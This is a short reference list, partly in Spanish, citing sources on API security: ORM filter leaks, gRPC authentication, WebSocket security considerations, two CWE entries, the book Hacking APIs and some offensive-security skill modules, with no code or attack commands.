- elttam — *plORMbing your Django ORM* y *plORMbing your Prisma ORM* (fugas mediante filtros del ORM, 2024): https://www.elttam.com/blog/
- gRPC — Authentication guide: https://grpc.io/docs/guides/auth/ · grpcurl: https://github.com/fullstorydev/grpcurl
- RFC 6455 (WebSocket), sección 10 — Security Considerations: https://datatracker.ietf.org/doc/html/rfc6455#section-10
- CWE-915: https://cwe.mitre.org/data/definitions/915.html · CWE-1385: https://cwe.mitre.org/data/definitions/1385.html
- Corey Ball — *Hacking APIs* (No Starch Press)
- SnailSploit offensive skills (MIT): offensive-api-security, offensive-api-abuse
